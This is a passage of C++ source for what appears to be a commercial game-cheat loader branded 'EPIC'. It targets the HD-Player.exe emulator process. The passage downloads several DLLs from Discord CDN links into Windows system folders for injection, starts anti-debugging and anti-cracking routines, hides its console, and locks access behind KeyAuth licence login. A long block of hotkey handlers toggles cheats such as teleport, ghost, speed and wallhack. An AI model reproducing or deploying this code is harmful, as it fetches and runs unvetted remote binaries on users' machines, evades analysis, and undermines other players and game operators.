        char local[] = "C:\\Windows\\Temp\\boxrgb.dll";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }
    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1193710268505665600/1208450642343886898/boxrgb.dll?ex=65e3545d&is=65d0df5d&hm=6a409058037e60b5904a50082c0ef2488b0e1da69f485e3c80546ff983ac460a&";
        char local[] = "C:\\Windows\\Temp\\boxrgb.dll";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }
    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1189355736749314048/1189367735721930812/ChamsRed.dll?ex=65a72285&is=6594ad85&hm=059656b67fc2da6125f8334de85ecc6ff8f41fd6b86b7e665811f7f2490bb03e&";
        char local[] = "C:\\Windows\\Temp\\ChamsRed.dll";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }
    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1193098907488636988/1194441515511066644/Ras1.dll?ex=65b05d58&is=659de858&hm=3b9be73ca29b6af29adadbc1d51807708309b078c570eca1ffcf17629516b711&";
        char local[] = "C:\\Windows\\Temp\\Ras1.dll";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }
    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1189355736749314048/1189366298195529758/win.dll?ex=65b05bae&is=659de6ae&hm=e19e8b5fcde93c8f54ecbcd6949e68dd63db0b29723ef1715b2423a0c3cb8cbc&";
        char local[] = "C:\\Windows\\Temp\\win.dll";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }


    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1193710268505665600/1208450681053253724/systen.dll";
        char local[] = "C:\\Windows\\Temp\\system.dll";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }




    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1193098907488636988/1196181239858729040/BlackAndRed.dll";
        char local[] = "C:\\Windows\\Temp\\BlackAndRed.dll";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }









    {
        HRESULT hr;
        char url[] = "https://cdn.discordapp.com/attachments/1193098907488636988/1196181214344785940/blanca.dll";
        char local[] = "C:\\Windows\\Temp\\blanca_1.dll";

        hr = URLDownloadToFile(NULL, url, local, 0, NULL);
    }











    char url2[] = "https://raw.githubusercontent.com/Anesss17/DLL1/main/ziit.dll";


    char local2[MAX_PATH];
    strcpy_s(local2, "C:\\Windows\\System32\\ziit.dll");


    //HRESULT hr2 = URLDownloadToFile(NULL, url2, local2, 0, NULL);





    const char* targetProcessName = "HD-Player.exe";


    const char* dllPath2 = "C:\\Windows\\System32\\boxrgb.dll";

    //
    //
    //CreateThread(nullptr, NULL, (LPTHREAD_START_ROUTINE)AlexanderConsoleDetector, nullptr, NULL, nullptr);

    //// SECURITY //

    //FileDetector();
    //CreateThread(nullptr, NULL, (LPTHREAD_START_ROUTINE)AlexanderAttacherDetector, nullptr, NULL, nullptr);
    //CreateThread(nullptr, NULL, (LPTHREAD_START_ROUTINE)AlexAntiCracker, nullptr, NULL, nullptr);

    std::thread(AntiDebug::AntiDebugLoop).detach();
    AlexanderAntiCrackSystem->nignog();

    // SECURITY //

    KeyAuthApp.init();
    if (!ProcId)
        ProcId = CMemory::Initialize()->GetProcessID();


    CMemory::Initialize()->Start(ProcId);

    KeyAuthApp.init();

    if (!KeyAuthApp.data.success)
    {
        MessageBoxA(NULL, KeyAuthApp.data.message.c_str(), NULL, NULL);

    }

    WNDCLASSEXW wc;
    wc.cbSize = sizeof(WNDCLASSEXW);
    wc.style = CS_CLASSDC;
    wc.lpfnWndProc = WndProc;
    wc.cbClsExtra = NULL;
    wc.cbWndExtra = NULL;
    wc.hInstance = nullptr;
    wc.hIcon = LoadIcon(0, IDI_APPLICATION);
    wc.hCursor = LoadCursor(0, IDC_ARROW);
    wc.hbrBackground = nullptr;
    wc.lpszMenuName = L"ImGui";
    wc.lpszClassName = L"EPIC";
    wc.hIconSm = LoadIcon(0, IDI_APPLICATION);

    RegisterClassExW(&wc);
    hwnd = CreateWindowExW(NULL, wc.lpszClassName, L"EPIC", WS_POPUP, (GetSystemMetrics(SM_CXSCREEN) / 2) - (700 / 2), (GetSystemMetrics(SM_CYSCREEN) / 2) - (640 / 2), 950, 640, 0, 0, 0, 0);

    if (GetAsyncKeyState(VK_DELETE) & 1)
    {
       exit(0);
    }


    MARGINS margins = { -1 };
    DwmExtendFrameIntoClientArea(hwnd, &margins);

    POINT mouse;
    rc = { 0 };
    GetWindowRect(hwnd, &rc);

    if (!CreateDeviceD3D(hwnd))
    {
        CleanupDeviceD3D();
        ::UnregisterClassW(wc.lpszClassName, wc.hInstance);
        return 1;
    }

    ::ShowWindow(hwnd, SW_SHOWDEFAULT);
    ::ShowWindow(GetConsoleWindow(), SW_HIDE);
    ::UpdateWindow(hwnd);

    IMGUI_CHECKVERSION();
    ImGui::CreateContext();
    ImGuiIO& io = ImGui::GetIO(); (void)io;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;
    io.ConfigFlags |= ImGuiConfigFlags_NavEnableGamepad;

    ImFontConfig cfg;
    cfg.FontBuilderFlags = ImGuiFreeTypeBuilderFlags_ForceAutoHint | ImGuiFreeTypeBuilderFlags_LightHinting | ImGuiFreeTypeBuilderFlags_LoadColor;

    font::poppins_medium = io.Fonts->AddFontFromMemoryTTF(poppins_medium, sizeof(poppins_medium), 17.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
    font::poppins_medium_low = io.Fonts->AddFontFromMemoryTTF(poppins_medium, sizeof(poppins_medium), 15.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
    font::tab_icon = io.Fonts->AddFontFromMemoryTTF(tabs_icons, sizeof(tabs_icons), 24.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
    font::tahoma_bold = io.Fonts->AddFontFromMemoryTTF(tahoma_bold, sizeof(tahoma_bold), 17.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
    font::tahoma_bold2 = io.Fonts->AddFontFromMemoryTTF(tahoma_bold, sizeof(tahoma_bold), 28.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
    font::chicons = io.Fonts->AddFontFromMemoryTTF(chicon, sizeof(chicon), 20.f, &cfg, io.Fonts->GetGlyphRangesCyrillic());
    ImFont* Nev = io.Fonts->AddFontFromMemoryTTF(&Nevan, sizeof Nevan, 35, NULL, io.Fonts->GetGlyphRangesCyrillic());


    //if (image::bg == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, background_image, sizeof(background_image), &info, pump, &image::bg, 0);
    if (image::logo == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, logo, sizeof(logo), &info, pump, &image::logo, 0);
    if (image::logo_general == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, logo_general, sizeof(logo_general), &info, pump, &image::logo_general, 0);


    if (image::arrow == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, arrow, sizeof(arrow), &info, pump, &image::arrow, 0);
    if (image::bell_notify == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, bell_notify, sizeof(bell_notify), &info, pump, &image::bell_notify, 0);
    if (image::roll == nullptr) D3DX11CreateShaderResourceViewFromMemory(g_pd3dDevice, roll, sizeof(roll), &info, pump, &image::roll, 0);


    ImGui_ImplWin32_Init(hwnd);
    ImGui_ImplDX11_Init(g_pd3dDevice, g_pd3dDeviceContext);

    bool show_another_window = false;
    ImVec4 clear_color = ImVec4(0.0f, 0.0f, 0.0f, 0.0f);

    bool done = false;
    while (!done)
    {

        MSG msg;
        while (::PeekMessage(&msg, nullptr, 0U, 0U, PM_REMOVE))
        {
            ::TranslateMessage(&msg);
            ::DispatchMessage(&msg);
            if (msg.message == WM_QUIT)
                done = true;
        }
        if (done)
            break;




        bool currentKey1g = IsKeyPressed('1');
        bool currentKey2g = IsKeyPressed('2');
        bool currentKey3g = IsKeyPressed('3');
        bool currentKeyF1g = IsKeyPressed(VK_F1);
        bool currentKeyF2g = IsKeyPressed(VK_F2);
        bool currentKeyF3g = IsKeyPressed(VK_F3);
        bool currentKeyF4g = IsKeyPressed(VK_F4);
        bool currentKeyQg = IsKeyPressed('Q');
        bool currentKeyEg = IsKeyPressed('E');






        if (fantasmast == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::fm = !bottons_dark::fm;
        }

        if (fantasmast == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::fm = !bottons_dark::fm;
        }

        if (fantasmast == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::fm = !bottons_dark::fm;
        }

        if (fantasmast == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::fm = !bottons_dark::fm;
        }

        if (fantasmast == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::fm = !bottons_dark::fm;
        }

        if (fantasmast == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::fm = !bottons_dark::fm;
        }

        if (fantasmast == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::fm = !bottons_dark::fm;
        }

        if (fantasmast == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::fm = !bottons_dark::fm;
        }

        if (fantasmast == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::fm = !bottons_dark::fm;
        }




        if (velosrapido == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::vc = !bottons_dark::vc;
        }

        if (velosrapido == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::vc = !bottons_dark::vc;
        }

        if (velosrapido == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::vc = !bottons_dark::vc;
        }

        if (velosrapido == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::vc = !bottons_dark::vc;
        }

        if (velosrapido == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::vc = !bottons_dark::vc;
        }

        if (velosrapido == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::vc = !bottons_dark::vc;
        }

        if (velosrapido == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::vc = !bottons_dark::vc;
        }

        if (velosrapido == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::vc = !bottons_dark::vc;
        }

        if (velosrapido == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::vc = !bottons_dark::vc;
        }




        if (camararafa == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::as = !bottons_dark::as;
        }

        if (camararafa == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::as = !bottons_dark::as;
        }

        if (camararafa == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::as = !bottons_dark::as;
        }

        if (camararafa == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::as = !bottons_dark::as;
        }

        if (camararafa == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::as = !bottons_dark::as;
        }

        if (camararafa == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::as = !bottons_dark::as;
        }

        if (camararafa == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::as = !bottons_dark::as;
        }

        if (camararafa == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::as = !bottons_dark::as;
        }

        if (camararafa == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::as = !bottons_dark::as;
        }




        if (saltoaltisimoxd == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::st = !bottons_dark::st;
        }

        if (saltoaltisimoxd == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::st = !bottons_dark::st;
        }

        if (saltoaltisimoxd == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::st = !bottons_dark::st;
        }

        if (saltoaltisimoxd == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::st = !bottons_dark::st;
        }

        if (saltoaltisimoxd == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::st = !bottons_dark::st;
        }

        if (saltoaltisimoxd == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::st = !bottons_dark::st;
        }

        if (saltoaltisimoxd == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::st = !bottons_dark::st;
        }

        if (saltoaltisimoxd == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::st = !bottons_dark::st;
        }

        if (saltoaltisimoxd == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::st = !bottons_dark::st;
        }






        if (teleporrafaxd == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::nm = !bottons_dark::nm;
        }

        if (teleporrafaxd == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::nm = !bottons_dark::nm;
        }

        if (teleporrafaxd == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::nm = !bottons_dark::nm;
        }

        if (teleporrafaxd == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::nm = !bottons_dark::nm;
        }

        if (teleporrafaxd == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::nm = !bottons_dark::nm;
        }

        if (teleporrafaxd == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::nm = !bottons_dark::nm;
        }

        if (teleporrafaxd == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::nm = !bottons_dark::nm;
        }

        if (teleporrafaxd == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::nm = !bottons_dark::nm;
        }

        if (teleporrafaxd == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::nm = !bottons_dark::nm;
        }











        if (fantasmaplay == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::fmpl = !bottons_dark::fmpl;
        }

        if (fantasmaplay == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::fmpl = !bottons_dark::fmpl;
        }

        if (fantasmaplay == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::fmpl = !bottons_dark::fmpl;
        }

        if (fantasmaplay == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::fmpl = !bottons_dark::fmpl;
        }

        if (fantasmaplay == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::fmpl = !bottons_dark::fmpl;
        }

        if (fantasmaplay == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::fmpl = !bottons_dark::fmpl;
        }

        if (fantasmaplay == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::fmpl = !bottons_dark::fmpl;
        }

        if (fantasmaplay == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::fmpl = !bottons_dark::fmpl;
        }

        if (fantasmaplay == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::fmpl = !bottons_dark::fmpl;
        }














        if (teleportplay == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::tpplay = !bottons_dark::tpplay;
        }

        if (teleportplay == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::tpplay = !bottons_dark::tpplay;
        }

        if (teleportplay == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::tpplay = !bottons_dark::tpplay;
        }

        if (teleportplay == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::tpplay = !bottons_dark::tpplay;
        }

        if (teleportplay == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::tpplay = !bottons_dark::tpplay;
        }

        if (teleportplay == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::tpplay = !bottons_dark::tpplay;
        }

        if (teleportplay == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::tpplay = !bottons_dark::tpplay;
        }

        if (speendtimer == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::tpplay = !bottons_dark::tpplay;
        }

        if (speendtimer == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::tpplay = !bottons_dark::tpplay;
        }





        if (camaraunder == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }









        if (speendtimer == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::sp = !bottons_dark::sp;
        }

        if (speendtimer == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::sp = !bottons_dark::sp;
        }

        if (speendtimer == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::sp = !bottons_dark::sp;
        }

        if (speendtimer == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::sp = !bottons_dark::sp;
        }

        if (speendtimer == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::sp = !bottons_dark::sp;
        }

        if (speendtimer == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::sp = !bottons_dark::sp;
        }

        if (speendtimer == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::sp = !bottons_dark::sp;
        }

        if (speendtimer == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::sp = !bottons_dark::sp;
        }

        if (speendtimer == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::sp = !bottons_dark::sp;
        }














        if (selectteleport == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::tp = !bottons_dark::tp;
        }

        if (selectteleport == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::tp = !bottons_dark::tp;
        }

        if (selectteleport == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::tp = !bottons_dark::tp;
        }

        if (selectteleport == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::tp = !bottons_dark::tp;
        }

        if (selectteleport == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::tp = !bottons_dark::tp;
        }

        if (selectteleport == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::tp = !bottons_dark::tp;
        }

        if (selectteleport == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::tp = !bottons_dark::tp;
        }

        if (selectteleport == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::tp = !bottons_dark::tp;
        }

        if (selectteleport == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::tp = !bottons_dark::tp;
        }
















        if (nosek == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::w = !bottons_dark::w;
        }

        if (nosek == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::w = !bottons_dark::w;
        }

        if (nosek == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::w = !bottons_dark::w;
        }

        if (nosek == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::w = !bottons_dark::w;
        }

        if (nosek == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::gh = !bottons_dark::gh;
        }

        if (nosek == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::w = !bottons_dark::w;
        }

        if (nosek == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::w = !bottons_dark::w;
        }

        if (nosek == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::w = !bottons_dark::w;
        }

        if (nosek == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::w = !bottons_dark::w;
        }


        if (selectghost == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::gh = !bottons_dark::gh;
        }

        if (selectghost == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::gh = !bottons_dark::gh;
        }

        if (selectghost == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::gh = !bottons_dark::gh;
        }

        if (selectghost == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::gh = !bottons_dark::gh;
        }

        if (selectghost == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::gh = !bottons_dark::gh;
        }

        if (selectghost == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::gh = !bottons_dark::gh;
        }

        if (selectghost == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::gh = !bottons_dark::gh;
        }

        if (selectghost == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::gh = !bottons_dark::gh;
        }

        if (selectghost == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::gh = !bottons_dark::gh;
        }





        if (wallchafa == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::cf = !bottons_dark::cf;
        }

        if (wallchafa == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::cf = !bottons_dark::cf;
        }

        if (wallchafa == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::cf = !bottons_dark::cf;
        }

        if (wallchafa == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::cf = !bottons_dark::cf;
        }

        if (wallchafa == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::cf = !bottons_dark::cf;
        }

        if (wallchafa == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::cf = !bottons_dark::cf;
        }

        if (wallchafa == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::cf = !bottons_dark::cf;
        }

        if (wallchafa == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::cf = !bottons_dark::cf;
        }

        if (wallchafa == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::cf = !bottons_dark::cf;
        }





        if (camaraunder == 1 && currentKey1g && !prevKey1g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 2 && currentKey2g && !prevKey2g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 3 && currentKey3g && !prevKey3g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 4 && currentKeyF1g && !prevKeyF1g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 5 && currentKeyF2g && !prevKeyF2g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 6 && currentKeyF3g && !prevKeyF3g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 7 && currentKeyF4g && !prevKeyF4g)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 8 && currentKeyQg && !prevKeyQg)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }

        if (camaraunder == 9 && currentKeyEg && !prevKeyEg)
        {
            bottons_dark::cm = !bottons_dark::cm;
        }










        prevKey1g = currentKey1g;
        prevKey2g = currentKey2g;
        prevKey3g = currentKey3g;
        prevKeyF1g = currentKeyF1g;
        prevKeyF2g = currentKeyF2g;
        prevKeyF3g = currentKeyF3g;
        prevKeyF4g = currentKeyF4g;
        prevKeyQg = currentKeyQg;
        prevKeyEg = currentKeyEg;


        tab_size = ImLerp(tab_size, tab_opening ? 160.f : 0.f, ImGui::GetIO().DeltaTime * 12.f);
        arrow_roll = ImLerp(arrow_roll, tab_opening && (tab_size >= 159) ? 1.f : -1.f, ImGui::GetIO().DeltaTime * 12.f);

        ImGui_ImplDX11_NewFrame();
        ImGui_ImplWin32_NewFrame();

        ImGui::NewFrame();
        {
            ImGuiStyle* s = &ImGui::GetStyle();

            s->WindowPadding = ImVec2(0, 0), s->WindowBorderSize = 0;
            s->ItemSpacing = ImVec2(20, 20);

            s->ScrollbarSize = 8.f;

            if (authenticed == false)
            {
                ImGui::SetNextWindowPos(ImVec2(0, 0));
                ImGui::SetNextWindowSize(ImVec2(c::bg::size) + ImVec2(tab_size, 0));
                ImGui::Begin("EPIC  Menu", nullptr, ImGuiWindowFlags_NoDecoration | ImGuiWindowFlags_NoResize | ImGuiWindowFlags_NoBringToFrontOnFocus);
                {
                    if (GetTickCount() > loader_animation + (1 * 15))
                    {

                        if (text_animation_hide) {
                            if (text_animation < 0.80f)
                                text_animation += 0.03f / ImGui::GetIO().Framerate * 20.f;

                            if (text_animation >= 0.80f)
                                text_animation_hide = false;
                        }
                        else {
                            if (text_animation > 0.00f)
                                text_animation -= 0.03f / ImGui::GetIO().Framerate * 20.f;
                            if (text_animation <= 0.00f)
                                text_animation_hide = true;
                        }
                        loader_animation = 0;
                    }
                    const ImVec2& pos = ImGui::GetWindowPos();
                    const auto& p = ImGui::GetWindowPos();
                    const ImVec2 spacing = ImGui::GetStyle().ItemSpacing;

                    //ImGuiStyle& s = ImGui::GetStyle();
                    //auto draw = ImGui::GetWindowDrawList();
                    Trinage_background();
                    //draw->AddRect(p + ImVec2(1, 1), p + ImVec2(825, 602), ImColor(92, 217, 228, 255), s.WindowRounding, ImDrawCornerFlags_All, 2.0f);

                    ImGui::GetBackgroundDrawList()->AddRectFilled(pos, pos + ImVec2(c::bg::size) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::bg::background), c::bg::rounding);
                    ImGui::GetBackgroundDrawList()->AddRect(pos, pos + ImVec2(c::bg::size) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::bg::outline_background), c::bg::rounding);

                    //const int vtx_idx_1 = 1;
                    //ImGui::GetWindowDrawList()->AddRect(ImVec2(1, 1), ImVec2(c::bg::size2) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::bg::background), c::bg::rounding, ImDrawFlags_None, 2.f);
                    //ImGui::ShadeVertsLinearColorGradientKeepAlpha(ImGui::GetWindowDrawList(), vtx_idx_1, ImGui::GetWindowDrawList()->VtxBuffer.Size, ImVec2(1, 1), ImVec2(c::bg::size) + ImVec2(tab_size, 0), ImGui::GetColorU32(c::general_color), ImColor(14, 14, 15, 255));



                    ImGui::GetBackgroundDrawList()->AddRect(p + ImVec2(1, 1), p + ImVec2(910, 640), ImGui::GetColorU32(c::accent_color), c::bg::rounding, ImDrawCornerFlags_All, 2.0f);

                    ImGui::SetCursorPos(ImVec2(50, 250));
                    ImGui::BeginGroup();
                    {
                        ImGui::SetCursorPos(ImVec2(20, 10));
                        if (ImGui::CustomButton(1, image::logo, ImVec2(40, 50), ImVec2(0, 0), ImVec2(1, 1), ImGui::GetColorU32(c::accent_color))) {
                            ShellExecute(NULL, "open", "https://discord.gg/EFYhqzPjpu", NULL, NULL, SW_SHOWNORMAL);
                        }
                        const auto& CurrentWindowPos = ImGui::GetWindowPos();
                        const auto& pWindowDrawList = ImGui::GetWindowDrawList();
                        const auto& pForegroundDrawList = ImGui::GetForegroundDrawList();
                        pWindowDrawList->AddText(Nev, 70.f, ImVec2(250 + CurrentWindowPos.x, 120 + CurrentWindowPos.y), ImColor(1.f, 0.f, 0.f, text_animation), "EPIC ENGINE");

                        ImGui::SetCursorPos(ImVec2(300, 280));
                        ImGui::InputText("Username", globals.Username, 64);
                        ImGui::SetCursorPos(ImVec2(300, 330));

                       ImGui::InputText("Password", globals.Password, 64);
                       
                        
                        ImGui::SetCursorPos(ImVec2(300, 375));
                        ImGui::InputText("Key", globals.license, 64);




                        ImGui::SetCursorPos(ImVec2(300, 435));
                        if (ImGui::Button("Login", ImVec2(300, 40)))
                        {
                            KeyAuthApp.login(globals.Username, globals.Password);
                            if (KeyAuthApp.data.success)
                            {
                    
                                authenticed = true;
                       


                                std::string username = "User: " + KeyAuthApp.data.username;
                                std::string expiry = KeyAuthApp.data.expiry;
                                std::time_t expiryTime = std::atoi(expiry.c_str());
                                DiscordEventHandlers Handle;
                                memset(&Handle, 0, sizeof(Handle));
                                Discord_Initialize("1235863365570662400", &Handle, 1, NULL);
                                DiscordRichPresence discordPresence;
                                memset(&discordPresence, 0, sizeof(discordPresence));
                                char formattedExpiry[17];
                                std::tm* tmPtr = std::localtime(&expiryTime);
                                std::strftime(formattedExpiry, sizeof(formattedExpiry), "expry: %m/%d/%y", tmPtr);
                                discordPresence.state = formattedExpiry;
                                discordPresence.details = username.c_str();
                                discordPresence.startTimestamp = eptime;

                                discordPresence.largeImageKey = "https://c.top4top.io/p_3070d9rqTf1.gif";
                                discordPresence.smallImageKey = "https://l.top4top.io/p_3070htwTzw1.gif";
                                discordPresence.largeImageText = "Copyright By !EPIC.Dev";
                                discordPresence.smallImageText = "</> !EPIC.Dev";
                                discordPresence.button1_label = "Discord";
                                discordPresence.button1_url = "";
                                
                                discordPresence.button2_label = "Buy Panel";
                                discordPresence.button2_url = "";

                                Discord_UpdatePresence(&discordPresence);







                            }
                        }

                        ImGui::SetCursorPos(ImVec2(300, 480));
                        if (ImGui::Button("Register", ImVec2(300, 40)))
                        {
                            KeyAuthApp.regstr(globals.Username, globals.Password, globals.license);
                            if (KeyAuthApp.data.success)
                            {
                              
                                authenticed = true;
                            }
                        }

                    }
                    ImGui::EndGroup();
                    move_window();

                    ImGui::End();
                }
            }


